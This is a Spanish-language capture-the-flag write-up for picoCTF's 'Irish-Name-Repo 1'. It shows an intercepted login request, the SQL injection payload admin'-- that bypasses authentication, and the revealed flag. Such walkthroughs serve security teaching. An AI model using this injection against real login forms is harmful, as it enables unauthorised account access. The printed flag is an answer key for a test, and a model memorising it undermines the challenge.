# Irish-Name-Repo 1

## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

## Solucion
Accedemos al sitio con el link que nos proporciona el reto y despues vamos a la ventana de admin login.
Probamos con credenciales sencillas como `username:admin; password:admin`
Pero vemos que no funcionan, entonces con ayuda de burpsuite vamos a ver si podemos obtener una pista al ver la peticion.
``
```
POST /problem/39720/login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://jupiter.challenges.picoctf.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://jupiter.challenges.picoctf.org/problem/39720/login.html
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=admin&password=admin&debug=0
```
Vemos que simplemente se envia lo que escribimos y en el orden que lo hacemos, por la pista nos damos cuenta que tal vez tenga algo que ver con bases de datos, entonces probamos con una inyeccion SQL:
```
username=admin'--&password=admin&debug=0
```
Y vemos que funciono, la respuesta nos devuelve la flag:
```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 30 Mar 2025 01:06:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Strict-Transport-Security: max-age=0
Content-Length: 66

<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>
```

```flag
picoCTF{s0m3_SQL_c218b685}
```


## Notas adicionales

## Referencias
